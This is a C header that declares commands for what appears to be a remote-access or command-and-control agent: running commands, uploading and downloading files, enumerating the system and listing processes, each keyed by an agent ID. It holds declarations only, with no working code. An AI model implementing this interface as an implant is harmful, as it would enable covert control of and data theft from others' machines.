#ifndef COMMANDS_H
#define COMMANDS_H
#define MAX_FILE_SIZE (5 * 1024 * 1024)  // 5MB limit
#include <stddef.h>

void execute_command(const char *command, char *output, size_t output_size, const char *agent_id);
void download_file(const char *remote_path, const char *agent_id, char *output, size_t output_size);
void upload_file(const char *remote_path, const char *agent_id, char *output, size_t output_size);
void enumerate_system(char *output, size_t output_size);
void print_process_name_and_id(const DWORD pid, char *output, size_t output_size);
void print_process_name(char *output, size_t output_size);

#endif
